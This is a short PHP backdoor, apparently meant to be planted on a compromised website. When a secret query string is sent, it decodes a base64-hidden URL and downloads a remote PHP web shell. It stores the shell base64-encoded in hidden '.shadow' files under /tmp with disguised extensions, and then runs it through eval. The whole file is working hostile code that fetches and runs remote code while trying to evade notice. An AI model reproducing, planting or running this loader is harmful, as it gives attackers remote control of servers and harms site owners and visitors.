<?php
if ($_SERVER['QUERY_STRING'] === 'JandaPirangAbang') {

    $REMOTE_SHELL_URL = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzVZNEgvc2VvL21haW4vc2VvYmFyYmFyLnBocA==');
    $LOCAL_CACHE_DIR  = '/tmp/';

    // 🔄 Tiga ekstensi alternatif, semua base64-encoded
    $EXTENSIONS = ['log', 'cache', 'dat'];
    $hash = md5(__FILE__ . php_uname());
    $filenames = array_map(function ($ext) use ($hash, $LOCAL_CACHE_DIR) {
        return rtrim($LOCAL_CACHE_DIR, '/\\') . DIRECTORY_SEPARATOR . ".shadow_{$hash}." . $ext;
    }, $EXTENSIONS);

    $shell_found = false;

    // 🔎 Cari file shell yang valid
    foreach ($filenames as $file) {
        if (file_exists($file)) {
            $shell_found = $file;
            break;
        }
    }

    // ⬇️ Download & simpan semua jika belum ada
    if (!$shell_found) {
        $raw = @file_get_contents($REMOTE_SHELL_URL);

        if (!$raw || stripos($raw, '<html') !== false || strlen($raw) < 10) {
            http_response_code(500);
            die("❌ Gagal ambil shell atau isi bukan PHP.");
        }

        $encoded = base64_encode($raw);

        foreach ($filenames as $file) {
            @file_put_contents($file, $encoded);
        }

        $shell_found = $filenames[0]; // default pakai yang pertama
    }

    // 🔓 Baca, decode, dan jalankan shell
    try {
        $encoded = file_get_contents($shell_found);
        $decoded = base64_decode($encoded);
        eval("?>$decoded");
    } catch (Throwable $e) {
        http_response_code(500);
        echo "❌ Error saat eksekusi shell: " . htmlspecialchars($e->getMessage());
    }

    exit;
}
?>

